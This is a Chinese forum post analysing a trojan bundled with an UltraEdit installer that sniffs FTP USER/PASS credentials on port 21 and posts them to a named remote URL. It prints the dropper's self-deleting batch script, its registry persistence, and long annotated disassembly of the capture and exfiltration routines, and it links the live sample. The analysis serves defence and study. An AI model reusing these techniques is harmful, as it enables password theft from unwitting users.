

# 一个通过解析数据包获取密码的木马之详细分析

> 原文：[`www.pediy.com/kssd/pediy11/120193.html`](https://www.pediy.com/kssd/pediy11/120193.html)

木马时间戳：2010-08-25 10:41:03  
样本来源：[`www.crsky.com/soft/7033.html`](http://www.crsky.com/soft/7033.html)   
详情：[`www.52pojie.cn/thread-62464-1-1.html`](http://www.52pojie.cn/thread-62464-1-1.html)  
Hmily 牛发现的霏凡站的【UltraEdit-32 文本编辑器 v16.20.0.1009 汉化版】被捆绑了木马。  
先谢谢 Hmily 牛提供样本。  
  
**MPC.exe 分析（木马主体）**  
  
0，打开一个 Mutex"\_\_i386vm\_jre1.6\_\_",该 Mutex 由 inetwh32.dll 创建，避免重复感染。  
  
1，创建%Sysemroot%\\\\inetwh32.dll，提取本身 30 号 DDX 资源并写入。  
  
2，以隐藏窗口的方式运行"rundll32.exe "C:\\WINDOWS\\inetwh32.dll",wWinMain",注入 dll 并调用 wWinMain 函  
数  
  
3，创建注册表启动项：HKML\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\Explorer\\Run  
新建注册表项"Bluetooth"，值为"rundll32.exe "C:\\WINDOWS\\inetwh32.dll",wWinMain"  
  
4，在临时文件夹下创建并运行 deleteMe.bat，内容为：  
  

代码:

```
:pp
del "C:\\Documents and Settings\\Administrator\\桌面\\MPC.exe"
if exist "C:\\Documents and Settings\\Administrator\\桌面\\MPC.exe" goto pp
del "C:\\DOCUME~1\\ADMINI~1\\LOCALS~1\\Temp\\deleteMe.bat"

```

  
删除病毒和批处理自身。  
  
  
  
  
**inetw32.dll 分析**  
  
0，为 rundll32.exe 设置含有空 ACL 的 SD，使得所有其他进程可以访问本进程。  
  
1，创建 Mutex  "\_\_i386vm\_jre1.6\_\_"  
  
2，创建名为"TtsWin"的隐藏窗口,创建 1 号定时器并立即触发，Timer 处理函数中先获取本机 IP,启动一个线程，  
最后清除定时器自身。  
  
3，在创建的线程中先另创建一个线程，循环执行代码  
代码:

```
while(1)
{
    SleepEx(INFNITE, 1);
}

```

此线程用于执行 post 过滤的信息到远端服务器。用 QueueUserAPC 插入此线程。  
然后绑定本机 21 端口，过滤数据包。  
  
4，把截获到的用户名和密码 post 到[`passport.flashfxp.info/dll/FtpServer.dll`](http://passport.flashfxp.info/dll/FtpServer.dll)，至于他到底是截获什么的帐号和密码我就不知道了~  
  
5，下面是木马使用到的自定义数据结构，unkonw 标记的为没使用到的数据。  
  
接收的数据包结构：  
代码:

```
struct \_DATA\_PACK{
    struct \_STRUCT1{  
  DWORD index;    //低 4 位保存着数据包中第一个结构的大小，单位为 4 字节
  byte unkonw5;
  byte unkonw6;
  byte unkonw7;
  byte unkonw8;
  byte unkonw9;
  byte VerifyByte\_Is\_6;  //通过此位来是不是 6，判断是否为要过滤的数据包
  byte unkonw11;
  byte unkonw12;
  DWORD dw1;  //存储指令类型相关信息，连贯的指令需要此处相同
  DWORD dw2;  //存储指令类型相关信息，连贯的指令需要此处相同
  ……
    }
    struct \_STRUCT2{
  WORD w1;  //存储指令类型相关信息，连贯的指令需要此处相同
  WORD w2;  //存储指令类型相关信息，连贯的指令需要此处相同
  DWORD dw2;
  DWORD dw3;
  byte StructLength;    //高 4 位存储的是第二个结构的长度，单位为 4 字节
  byte sign;        //该位如果为 1 或 4，则不处理该数据包
  ……
    }

    struct \_INFO{
  char info\[变长\];//需要进行拦截的信息
  //用户名名格式："USER XXXXXXX" X 即为用户名，空格可以多个
  //密码格式： "PASS XXXXXX" X 即为密码，空格可以多个
    }
}

```

10003180 处保存的是\_APP\_DATA 链表，大小为 0x40 个，\_APP\_DATA 的长度为 0x98  
当 21 号端口收到指令，则从本链表最后提取一个结构，用于保存指令内容，并添加到 OffSET\_3160 结构链表中等  
待处理  
代码:

```
struct \_APP\_DATA{
  DWORD pre\_ptr\_APPDATA;  //保存着上一个 APP\_DATA 结构的指针，第一个节点的值为 10003168
  DWORD next\_ptr\_APPDATA; //保存着下一个 APP\_DATA 结构体指针，最后一个节点的值为 10003168
  DWORD struct1dw2;  //指令类型匹配信息
  DWORD struct1dw1;  //指令类型匹配信息
  WORD struct2w2;    //指令类型匹配信息
  WORD struct2w1;    //指令类型匹配信息
  DWORD SystemStartedTime; //GetTickCount();
  char string\[127\];    //保存接收到的 username or passwords
  ……
}

```

//该结构用与记录正在处理的 APP\_DATA 结构链表，处理之后放到\_APP\_DATA 结构链表最后  
代码:

```
struct \_OFFSET\_3160{
  DWORD dw1;     //上一个指令结构，初始化时指向自身
  DWORD dw2;     //下一个指令结构初始化时指向自身
}

```

//该结构用于维护 APP\_DATA 链表  
代码:

```
struct \_OFFSET\_3168{
  DWORD ptr\_LAST\_APP\_DATA; //保存着 APP\_DATA 链表最后一个节点
  DWORD ptr\_APP\_DATA;  //保存着 APP\_DATA 链表的第一个节点
}

```

//该结构为发送到远端服务器的信息格式结构  
代码:

```
struct buffer\_524{
  DWORD struct1dw2;  //指令类型匹配信息
  WORD struct2w2;    //指令类型匹配信息
  WORD UserNameLength;  //用户名长度
  char content\[127\]; //格式为"username password" 
}

```

  
  
MainThread  //数据包的主处理过程  
代码:

```

.text:100013C0 ; int \_\_cdecl MainThread(HANDLE hThread\_Sleep, int buffer, int buflen)
.text:100013C0 MainThread      proc near               ; CODE XREF: MainProc+115p
.text:100013C0
.text:100013C0 Pass\_Content    = byte ptr -80h
.text:100013C0 hThread\_Sleep   = dword ptr  8
.text:100013C0 buffer          = dword ptr  0Ch
.text:100013C0 buflen          = dword ptr  10h
.text:100013C0
.text:100013C0                 push    ebp             ; 此函数处理 21 号端口接收到的信息
.text:100013C1                 mov     ebp, esp
.text:100013C3                 sub     esp, 80h
.text:100013C9                 push    ebx
.text:100013CA                 push    esi
.text:100013CB                 mov     esi, \[ebp+buffer\]
.text:100013CE                 xor     eax, eax        ; eax=0
.text:100013D0                 mov     al, \[esi\]       ; al=接受的信息的第一个 byte
.text:100013D2                 mov     ecx, eax        ; ecx=接受的信息的第一个 byte
.text:100013D4                 and     ecx, 1111b      ; ecx=buffer 第一个 byte 的低 4 位
.text:100013D7                 cmp     byte ptr \[esi+9\], 6 ; 判断接收信息的第十个 byte 是否为 6
.text:100013DB                 lea     ebx, \[esi+ecx\*4\] ; ebx = STRUCT2
.text:100013DE                 jnz     loc\_10001561
.text:100013E4                 and     al, 11110000b
.text:100013E6                 cmp     al, 1000000b
.text:100013E8                 jnz     loc\_10001561
.text:100013EE                 movzx   eax, byte ptr \[ebx+0Ch\] ; eax = buffer 中的(buffer 第一个 byte 的低 4 位 \* 4 + 0x0C)位
.text:100013F2                 shr     eax, 4          ; eax = eax / 16
.text:100013F5                 add     eax, ecx        ; eax = eax + 接收信息中第一个 byte 的低 4 位
.text:100013F7                 push    edi
.text:100013F8                 mov     edi, \[ebp+buflen\] ; edi = 接收信息长度
.text:100013FB                 shl     eax, 2          ; eax = eax \* 4  eax = 数据包头大小
.text:100013FE                 sub     edi, eax        ; edi = edi - eax
.text:10001400                 cmp     edi, 5          ; edi = 数据包 - 数据包头后剩余的信息长度
.text:10001403                 lea     ecx, \[eax+esi\]
.text:10001406                 mov     \[ebp+buffer\], ecx ; 在第一个 DWORD 中保存实体数据的指针
.text:10001409                 jbe     INFO\_less\_equal\_5
.text:1000140F                 cmp     edi, 1500       ; 如果实体数据长度不小于 1500
.text:10001415                 jnb     INFO\_less\_equal\_5
.text:1000141B                 push    5               ; 如果 5<实体数据长度<1500 则来到这里
.text:1000141D                 push    offset aUser    ; "USER "
.text:10001422                 push    ecx             ; buffer + eax
.text:10001423                 call    VerifyInfo
.text:10001428                 add     esp, 0Ch
.text:1000142B                 test    eax, eax
.text:1000142D                 push    5
.text:1000142F                 jz      short loc\_10001492
.text:10001431                 pop     ecx             ; ecx = 5
.text:10001432                 cmp     edi, ecx
.text:10001434                 jbe     short loc\_10001444
.text:10001436
.text:10001436 loc\_10001436:                           ; CODE XREF: MainThread+82j
.text:10001436                 mov     eax, \[ebp+buffer\]
.text:10001439                 cmp     byte ptr \[ecx+eax\], ' '
.text:1000143D                 jnz     short loc\_10001444
.text:1000143F                 inc     ecx
.text:10001440                 cmp     ecx, edi
.text:10001442                 jb      short loc\_10001436
.text:10001444
.text:10001444 loc\_10001444:                           ; CODE XREF: MainThread+74j
.text:10001444                                         ; MainThread+7Dj
.text:10001444                 xor     edx, edx
.text:10001446                 jmp     short loc\_10001465
.text:10001448 ; ---------------------------------------------------------------------------
.text:10001448
.text:10001448 loc\_10001448:                           ; CODE XREF: MainThread+A7j
.text:10001448                 cmp     edx, 127
.text:1000144B                 jge     short loc\_10001469
.text:1000144D                 mov     eax, \[ebp+buffer\]
.text:10001450                 mov     al, \[ecx+eax\]
.text:10001453                 cmp     al, 13          ; 不是回车
.text:10001455                 jz      short loc\_10001469
.text:10001457                 cmp     al, 10          ; 不是换行
.text:10001459                 jz      short loc\_10001469
.text:1000145B                 test    al, al          ; 空格则直接跳转
.text:1000145D                 jz      short loc\_10001469
.text:1000145F                 mov     \[ebp+edx+Pass\_Content\], al ; 填充内容
.text:10001463                 inc     ecx
.text:10001464                 inc     edx
.text:10001465
.text:10001465 loc\_10001465:                           ; CODE XREF: MainThread+86j
.text:10001465                 cmp     ecx, edi
.text:10001467                 jb      short loc\_10001448
.text:10001469
.text:10001469 loc\_10001469:                           ; CODE XREF: MainThread+8Bj
.text:10001469                                         ; MainThread+95j ...
.text:10001469                 lea     eax, \[ebp+Pass\_Content\]
.text:1000146C                 push    eax             ; lpString2
.text:1000146D                 xor     eax, eax
.text:1000146F                 mov     ax, \[ebx\]       ; ax=STRUCT2.w1
.text:10001472                 mov     \[ebp+edx+Pass\_Content\], 0 ; 字符串后补 0
.text:10001477                 push    eax             ; STRUCT2.w1
.text:10001478                 xor     eax, eax
.text:1000147A                 mov     ax, \[ebx+2\]     ; ax=STRUCT2.w2
.text:1000147E                 push    eax             ; STRUCT2.w2
.text:1000147F                 push    dword ptr \[esi+0Ch\] ; STRUCT1.dw1
.text:10001482                 push    dword ptr \[esi+10h\] ; STRUCT1.dw2
.text:10001485                 call    SaveToStruct    ; 保存数据到全局链表\_APP\_DATA 的最后一个节点中
.text:10001485                                         ; 并从链表中剔除此节点，然后用 OFFSET\_3160 结构记录此节点
.text:1000148A                 add     esp, 14h
.text:1000148D                 jmp     loc\_10001560
.text:10001492 ; ---------------------------------------------------------------------------
.text:10001492
.text:10001492 loc\_10001492:                           ; CODE XREF: MainThread+6Fj
.text:10001492                 push    offset aPass    ; "PASS "
.text:10001497                 push    \[ebp+buffer\]
.text:1000149A                 call    VerifyInfo
.text:1000149F                 add     esp, 0Ch
.text:100014A2                 test    eax, eax
.text:100014A4                 jz      loc\_10001560
.text:100014AA                 push    5
.text:100014AC                 pop     ecx
.text:100014AD                 cmp     edi, ecx
.text:100014AF                 jbe     short loc\_100014BF
.text:100014B1
.text:100014B1 loc\_100014B1:                           ; CODE XREF: MainThread+FDj
.text:100014B1                 mov     eax, \[ebp+buffer\]
.text:100014B4                 cmp     byte ptr \[ecx+eax\], ' '
.text:100014B8                 jnz     short loc\_100014BF
.text:100014BA                 inc     ecx
.text:100014BB                 cmp     ecx, edi
.text:100014BD                 jb      short loc\_100014B1
.text:100014BF
.text:100014BF loc\_100014BF:                           ; CODE XREF: MainThread+EFj
.text:100014BF                                         ; MainThread+F8j
.text:100014BF                 xor     edx, edx
.text:100014C1                 jmp     short loc\_100014E0
.text:100014C3 ; ---------------------------------------------------------------------------
.text:100014C3
.text:100014C3 loc\_100014C3:                           ; CODE XREF: MainThread+122j
.text:100014C3                 cmp     edx, 127        ; 限制长度为 127
.text:100014C6                 jge     short loc\_100014E4
.text:100014C8                 mov     eax, \[ebp+buffer\]
.text:100014CB                 mov     al, \[ecx+eax\]   ; 取密码
.text:100014CE                 cmp     al, 13          ; 不是回车
.text:100014D0                 jz      short loc\_100014E4
.text:100014D2                 cmp     al, 10          ; 不是换行
.text:100014D4                 jz      short loc\_100014E4
.text:100014D6                 test    al, al          ; 空格，则直接跳转
.text:100014D8                 jz      short loc\_100014E4
.text:100014DA                 mov     \[ebp+edx+Pass\_Content\], al ; 填充内容
.text:100014DE                 inc     ecx
.text:100014DF                 inc     edx
.text:100014E0
.text:100014E0 loc\_100014E0:                           ; CODE XREF: MainThread+101j
.text:100014E0                 cmp     ecx, edi
.text:100014E2                 jb      short loc\_100014C3
.text:100014E4
.text:100014E4 loc\_100014E4:                           ; CODE XREF: MainThread+106j
.text:100014E4                                         ; MainThread+110j ...
.text:100014E4                 xor     eax, eax
.text:100014E6                 mov     ax, \[ebx\]       ; eax=STRUCT2.w1
.text:100014E9                 mov     \[ebp+edx+Pass\_Content\], 0 ; 末尾补 0
.text:100014EE                 push    eax
.text:100014EF                 xor     eax, eax
.text:100014F1                 mov     ax, \[ebx+2\]     ; eax=STRUCT2.w2
.text:100014F5                 push    eax
.text:100014F6                 push    dword ptr \[esi+0Ch\] ; STRUCT1.dw1
.text:100014F9                 push    dword ptr \[esi+10h\] ; STRUCT1.dw2
.text:100014FC                 call    VerifyData      ; 如果输入的是密码，则进行指令匹配
.text:10001501                 mov     edi, eax        ; 返回对应的节点指针
.text:10001503                 add     esp, 10h
.text:10001506                 test    edi, edi
.text:10001508                 jz      short loc\_10001560
.text:1000150A                 lea     eax, \[ebp+Pass\_Content\]
.text:1000150D                 push    eax             ; 输入的 PASS 内容
.text:1000150E                 lea     eax, \[edi+18h\]
.text:10001511                 push    eax             ; 输入的 USER 内容
.text:10001512                 xor     eax, eax
.text:10001514                 mov     ax, \[ebx+2\]
.text:10001518                 push    eax             ; STRUCT2.w2
.text:10001519                 push    dword ptr \[esi+10h\] ; STRUCT1.dw2
.text:1000151C                 push    \[ebp+hThread\_Sleep\] ; hThread\_Sleep
.text:1000151F                 call    PostUserPass
.text:10001524                 push    edi
.text:10001525                 call    MoveNodeToLast  ; 移动节点到链表最后
.text:1000152A                 add     esp, 18h
.text:1000152D                 jmp     short loc\_10001560
.text:1000152F ; ---------------------------------------------------------------------------
.text:1000152F
.text:1000152F INFO\_less\_equal\_5:                      ; CODE XREF: MainThread+49j
.text:1000152F                                         ; MainThread+55j
.text:1000152F                 mov     al, \[ebx+13\]
.text:10001532                 test    al, 4           ; 该位不能是 4
.text:10001534                 jz      short loc\_10001560
.text:10001536                 test    al, 1           ; 该位不能是 1
.text:10001538                 jz      short loc\_10001560
.text:1000153A                 xor     eax, eax
.text:1000153C                 mov     ax, \[ebx\]
.text:1000153F                 push    eax
.text:10001540                 xor     eax, eax
.text:10001542                 mov     ax, \[ebx+2\]
.text:10001546                 push    eax
.text:10001547                 push    dword ptr \[esi+0Ch\]
.text:1000154A                 push    dword ptr \[esi+10h\]
.text:1000154D                 call    VerifyData      ; 验证指令
.text:10001552                 add     esp, 10h
.text:10001555                 test    eax, eax
.text:10001557                 jz      short loc\_10001560
.text:10001559                 push    eax
.text:1000155A                 call    MoveNodeToLast
.text:1000155F                 pop     ecx
.text:10001560
.text:10001560 loc\_10001560:                           ; CODE XREF: MainThread+CDj
.text:10001560                                         ; MainThread+E4j ...
.text:10001560                 pop     edi
.text:10001561
.text:10001561 loc\_10001561:                           ; CODE XREF: MainThread+1Ej
.text:10001561                                         ; MainThread+28j
.text:10001561                 pop     esi
.text:10001562                 pop     ebx
.text:10001563                 leave
.text:10001564                 retn
.text:10001564 MainThread      endp

```

PostUserPass  //发送拦截到的 username，password 到远端服务器  
代码:

```
.text:10001351 ; int \_\_cdecl PostUserPass(HANDLE hThread\_Sleep, int STRUCT1.dw2, \_\_int16 STRUCT2.w2, LPCSTR User\_Content, int Pass\_Content)
.text:10001351 PostUserPass    proc near               ; CODE XREF: MainThread+15Fp
.text:10001351
.text:10001351 hThread\_Sleep   = dword ptr  8
.text:10001351 STRUCT1.dw2     = dword ptr  0Ch
.text:10001351 STRUCT2.w2      = word ptr  10h
.text:10001351 User\_Content    = dword ptr  14h
.text:10001351 Pass\_Content    = dword ptr  18h
.text:10001351
.text:10001351 buffer\_524 = esi
.text:10001351                 push    ebp
.text:10001352                 mov     ebp, esp
.text:10001354                 push    buffer\_524
.text:10001355                 push    524             ; Size
.text:1000135A                 call    malloc
.text:1000135F                 mov     buffer\_524, eax
.text:10001361                 test    buffer\_524, buffer\_524
.text:10001363                 pop     ecx
.text:10001364                 jz      short loc\_100013BD
.text:10001366                 mov     eax, \[ebp+STRUCT1.dw2\]
.text:10001369                 push    ebx
.text:1000136A                 push    edi
.text:1000136B                 mov     edi, ds:lstrcpynA
.text:10001371                 push    127             ; iMaxLength
.text:10001373                 push    \[ebp+User\_Content\] ; lpString2
.text:10001376                 mov     \[buffer\_524\], eax
.text:10001378                 mov     ax, \[ebp+STRUCT2.w2\]
.text:1000137C                 lea     ebx, \[buffer\_524+8\]
.text:1000137F                 push    ebx             ; lpString1
.text:10001380                 mov     \[buffer\_524+4\], ax
.text:10001384                 call    edi ; lstrcpynA
.text:10001386                 push    ebx             ; lpString
.text:10001387                 call    ds:lstrlenA     ; 取得用户名长度
.text:1000138D                 inc     eax             ; 长度+1
.text:1000138E                 mov     \[buffer\_524+6\], ax
.text:10001392                 push    127             ; iMaxLength
.text:10001394                 push    \[ebp+Pass\_Content\] ; lpString2
.text:10001397                 movzx   eax, ax
.text:1000139A                 lea     eax, \[eax+buffer\_524+8\]
.text:1000139E                 push    eax             ; lpString1
.text:1000139F                 call    edi ; lstrcpynA
.text:100013A1                 push    buffer\_524      ; dwData
.text:100013A2                 push    \[ebp+hThread\_Sleep\] ; hThread
.text:100013A5                 push    offset pfnAPC   ; pfnAPC
.text:100013AA                 call    ds:QueueUserAPC ; 使用单独的线程来执行 pfnAPC 函数
.text:100013B0                 test    eax, eax
.text:100013B2                 pop     edi
.text:100013B3                 pop     ebx
.text:100013B4                 jnz     short loc\_100013BD
.text:100013B6                 push    buffer\_524      ; Memory
.text:100013B7                 call    free
.text:100013BC                 pop     ecx
.text:100013BD
.text:100013BD loc\_100013BD:                           ; CODE XREF: PostUserPass+13j
.text:100013BD                                         ; PostUserPass+63j
.text:100013BD                 pop     buffer\_524
.text:100013BE                 pop     ebp
.text:100013BF                 retn
.text:100013BF PostUserPass    endp

```

SaveToStruct    //从 APP\_DATA 结构链表中最后提取一个结构用于保存数据包信息，插入 OFFSET\_3160 链表中等待处理  
代码:

```
.text:10001094 ; int \_\_cdecl SaveToStruct(int STRUCT1.dw2, int STRUCT1.dw1, \_\_int16 STRUCT2.w2, \_\_int16 STRUCT2.w1, LPCSTR lpString2)
.text:10001094 SaveToStruct    proc near               ; CODE XREF: MainThread+C5p
.text:10001094
.text:10001094 systemStartedTime= dword ptr -4
.text:10001094 STRUCT1.dw2     = dword ptr  8
.text:10001094 STRUCT1.dw1     = dword ptr  0Ch
.text:10001094 STRUCT2.w2      = word ptr  10h
.text:10001094 STRUCT2.w1      = word ptr  14h
.text:10001094 lpString2       = dword ptr  18h
.text:10001094
.text:10001094                 push    ebp
.text:10001095                 mov     ebp, esp
.text:10001097                 push    ecx
.text:10001098                 push    esi
.text:10001099                 push    edi
.text:1000109A                 push    offset CriticalSection ; lpCriticalSection
.text:1000109F                 call    ds:EnterCriticalSection
.text:100010A5                 mov     esi, dword\_10003168
.text:100010AB                 cmp     esi, offset dword\_10003168
.text:100010B1                 jz      short loc\_1000110B ; 如果结构 3160 为空，则跳转
.text:100010B3                 mov     eax, \[esi\]      ; eax = 上一个 APP\_DATA 结构指针
.text:100010B5                 lea     edi, \[esi+4\]
.text:100010B8                 mov     ecx, \[edi\]      ; ecx = 下一个 APP\_DATA 结构指针
.text:100010BA                 mov     \[ecx\], eax      ; OFFSET\_3168.ptr\_LAST\_APP\_DATA = 上一个节点
.text:100010BC                 mov     \[eax+4\], ecx    ; 上一个节点的 next\_APP\_DATA 被设置为 OFFSET\_3168
.text:100010BC                                         ; 此出操作为从链表后删除一个节点
.text:100010BF                 mov     eax, \[ebp+STRUCT1.dw2\]
.text:100010C2                 mov     \[esi+8\], eax
.text:100010C5                 mov     ax, \[ebp+STRUCT2.w2\]
.text:100010C9                 mov     \[esi+10h\], ax
.text:100010CD                 mov     eax, \[ebp+STRUCT1.dw1\]
.text:100010D0                 mov     \[esi+0Ch\], eax
.text:100010D3                 mov     ax, \[ebp+STRUCT2.w1\]
.text:100010D7                 mov     \[esi+12h\], ax
.text:100010DB                 call    ds:GetTickCount
.text:100010E1                 push    127             ; iMaxLength
.text:100010E3                 push    \[ebp+lpString2\] ; lpString2
.text:100010E6                 mov     \[esi+14h\], eax
.text:100010E9                 lea     eax, \[esi+18h\]
.text:100010EC                 push    eax             ; lpString1
.text:100010ED                 call    ds:lstrcpynA
.text:100010F3                 mov     eax, dword\_10003160
.text:100010F8                 mov     \[esi\], eax      ; APP\_DATA.pre\_ptr\_APPDATA = OFFSET\_3160
.text:100010FA                 mov     dword ptr \[edi\], offset dword\_10003160 ; APP\_DATA.next\_ptr\_APPDATA = offset 10003160
.text:10001100                 mov     \[eax+4\], esi    ; OFFSET\_3160.dw2 = 最后一个节点 ptr\_LAST\_APP\_DATA
.text:10001103                 mov     dword\_10003160, esi ; 3160.dw1 = 3168.ptr\_LAST\_APP\_DATA
.text:10001109                 jmp     short loc\_10001168
.text:1000110B ; ---------------------------------------------------------------------------
.text:1000110B
.text:1000110B loc\_1000110B:                           ; CODE XREF: SaveToStruct+1Dj
.text:1000110B                 mov     edi, ds:GetTickCount
.text:10001111                 push    ebx
.text:10001112                 call    edi ; GetTickCount
.text:10001114                 mov     esi, dword\_10003160 ; esi = 3160.dw1
.text:1000111A                 mov     \[ebp+systemStartedTime\], eax
.text:1000111D                 mov     ebx, offset dword\_10003160
.text:10001122                 jmp     short loc\_10001163
.text:10001124 ; ---------------------------------------------------------------------------
.text:10001124
.text:10001124 loc\_10001124:                           ; CODE XREF: SaveToStruct+D1j
.text:10001124                 mov     eax, \[ebp+systemStartedTime\] ; 在 OFFSET\_3160 链表中查找过期指令，并覆盖
.text:10001127                 sub     eax, \[esi+14h\]  ; 计算两条指令的时间间隔
.text:1000112A                 cmp     eax, 90000
.text:1000112F                 jbe     short loc\_10001161 ; 如果<= 90 秒
.text:10001131                 mov     eax, \[ebp+STRUCT1.dw2\]
.text:10001134                 mov     \[esi+8\], eax
.text:10001137                 mov     ax, \[ebp+STRUCT2.w2\]
.text:1000113B                 mov     \[esi+10h\], ax
.text:1000113F                 mov     eax, \[ebp+STRUCT1.dw1\]
.text:10001142                 mov     \[esi+0Ch\], eax
.text:10001145                 mov     ax, \[ebp+STRUCT2.w1\]
.text:10001149                 mov     \[esi+12h\], ax
.text:1000114D                 call    edi ; GetTickCount
.text:1000114F                 push    127             ; iMaxLength
.text:10001151                 push    \[ebp+lpString2\] ; lpString2
.text:10001154                 mov     \[esi+14h\], eax
.text:10001157                 lea     eax, \[esi+18h\]
.text:1000115A                 push    eax             ; lpString1
.text:1000115B                 call    ds:lstrcpynA
.text:10001161
.text:10001161 loc\_10001161:                           ; CODE XREF: SaveToStruct+9Bj
.text:10001161                 mov     esi, \[esi\]
.text:10001163
.text:10001163 loc\_10001163:                           ; CODE XREF: SaveToStruct+8Ej
.text:10001163                 cmp     esi, ebx
.text:10001165                 jnz     short loc\_10001124
.text:10001167                 pop     ebx
.text:10001168
.text:10001168 loc\_10001168:                           ; CODE XREF: SaveToStruct+75j
.text:10001168                 push    offset CriticalSection ; lpCriticalSection
.text:1000116D                 call    ds:LeaveCriticalSection
.text:10001173                 pop     edi
.text:10001174                 pop     esi
.text:10001175                 leave
.text:10001176                 retn
.text:10001176 SaveToStruct    endp

```

GetCurIPAddr  //获取本机当前 IP  
代码:

```
.text:10001684 GetCurIPAddr    proc near               ; CODE XREF: WndProc+28p
.text:10001684
.text:10001684 pdwBestIfIndex  = dword ptr -0Ch
.text:10001684 SizePointer     = dword ptr -8
.text:10001684 curIP           = dword ptr -4
.text:10001684
.text:10001684                 push    ebp
.text:10001685                 mov     ebp, esp
.text:10001687                 sub     esp, 0Ch
.text:1000168A                 and     \[ebp+curIP\], 0
.text:1000168E                 push    ebx
.text:1000168F                 mov     ebx, ds:inet\_addr
.text:10001695                 lea     eax, \[ebp+pdwBestIfIndex\]
.text:10001698                 push    eax             ; pdwBestIfIndex
.text:10001699                 push    offset cp       ; "8.8.8.8"
.text:1000169E                 call    ebx ; inet\_addr
.text:100016A0                 push    eax             ; dwDestAddr
.text:100016A1                 call    GetBestInterface
.text:100016A6                 test    eax, eax
.text:100016A8                 jnz     short loc\_100016F9
.text:100016AA                 push    esi
.text:100016AB                 push    edi
.text:100016AC                 mov     edi, 10000h
.text:100016B1                 push    edi             ; Size
.text:100016B2                 call    malloc
.text:100016B7                 mov     esi, eax
.text:100016B9                 test    esi, esi
.text:100016BB                 pop     ecx
.text:100016BC                 jz      short loc\_100016F7
.text:100016BE                 lea     eax, \[ebp+SizePointer\]
.text:100016C1                 push    eax             ; SizePointer
.text:100016C2                 mov     \[ebp+SizePointer\], edi
.text:100016C5                 push    esi             ; AdapterInfo
.text:100016C6                 mov     edi, esi
.text:100016C8                 call    GetAdaptersInfo ; 获取当前网卡信息
.text:100016CD                 test    eax, eax
.text:100016CF                 jnz     short loc\_100016F0
.text:100016D1
.text:100016D1 loc\_100016D1:                           ; CODE XREF: GetCurIPAddr+5Cj
.text:100016D1                 mov     eax, \[esi+19Ch\]
.text:100016D7                 cmp     eax, \[ebp+pdwBestIfIndex\]
.text:100016DA                 jz      short loc\_100016E4
.text:100016DC                 mov     esi, \[esi\]
.text:100016DE                 test    esi, esi
.text:100016E0                 jnz     short loc\_100016D1
.text:100016E2                 jmp     short loc\_100016F0
.text:100016E4 ; ---------------------------------------------------------------------------
.text:100016E4
.text:100016E4 loc\_100016E4:                           ; CODE XREF: GetCurIPAddr+56j
.text:100016E4                 add     esi, IP\_ADAPTER\_INFO.IpAddressList.IpAddress
.text:100016EA                 push    esi             ; cp
.text:100016EB                 call    ebx ; inet\_addr
.text:100016ED                 mov     \[ebp+curIP\], eax
.text:100016F0
.text:100016F0 loc\_100016F0:                           ; CODE XREF: GetCurIPAddr+4Bj
.text:100016F0                                         ; GetCurIPAddr+5Ej
.text:100016F0                 push    edi             ; Memory
.text:100016F1                 call    free
.text:100016F6                 pop     ecx
.text:100016F7
.text:100016F7 loc\_100016F7:                           ; CODE XREF: GetCurIPAddr+38j
.text:100016F7                 pop     edi
.text:100016F8                 pop     esi
.text:100016F9
.text:100016F9 loc\_100016F9:                           ; CODE XREF: GetCurIPAddr+24j
.text:100016F9                 mov     eax, \[ebp+curIP\]
.text:100016FC                 pop     ebx
.text:100016FD                 leave
.text:100016FE                 retn
.text:100016FE GetCurIPAddr    endp

```

MoveNodeToLast  //把指定节点连接到 APP\_DATA 链表的最后  
代码:

```
.text:10001177 MoveNodeToLast  proc near               ; CODE XREF: MainThread+165p
.text:10001177                                         ; MainThread+19Ap
.text:10001177
.text:10001177 \_APP\_DATA       = dword ptr  4
.text:10001177
.text:10001177                 push    esi             ; 此函数把当前节点移到链表的最后
.text:10001178                 mov     esi, offset CriticalSection
.text:1000117D                 push    esi             ; lpCriticalSection
.text:1000117E                 call    ds:EnterCriticalSection
.text:10001184                 mov     eax, \[esp+4+\_APP\_DATA\]
.text:10001188                 mov     ecx, \[eax\]      ; ecx=pre\_ptr\_APPDATA
.text:1000118A                 mov     edx, \[eax+4\]    ; edx=next\_ptr\_APPDATA
.text:1000118D                 mov     \[edx\], ecx      ; 下一个节点的上一个节点修改为本节点的上一个节点
.text:1000118F                 mov     \[ecx+4\], edx    ; 上一个节点的下一个节点修改为本节点的下一个节点
.text:10001192                 mov     ecx, dword\_10003168 ; ecx = 最后一个节点
.text:10001198                 mov     \[eax\], ecx      ; 本节点的上一个节点修改为最后一个节点
.text:1000119A                 mov     dword ptr \[eax+4\], offset dword\_10003168 ; 本节点的下一个节点修改为 offset 10003168
.text:100011A1                 mov     \[ecx+4\], eax    ; 最后一个节点的下一个节点修改为本节点
.text:100011A4                 push    esi             ; lpCriticalSection
.text:100011A5                 mov     dword\_10003168, eax ; offset 10003168 的 ptr\_LAST\_APP\_DATA 修改为本节点
.text:100011AA                 call    ds:LeaveCriticalSection
.text:100011B0                 pop     esi
.text:100011B1                 retn
.text:100011B1 MoveNodeToLast  endp

```

idb 中有还算详细的注释，想深点了解的朋友可以直接看 idb,附件中包含了病毒样本。  
  
感谢所有看到这里的朋友，如有错误或不足希望能指出。

上传的附件
| ![](img/0623e01110d741fd20f66acbc8ec6f9d.jpg) || 病毒样本.rar\[解压密码是：kill\_virus\]  
 |
| ![](img/0623e01110d741fd20f66acbc8ec6f9d.jpg) || MPC.idb and inetwh32.idb.rar  
 |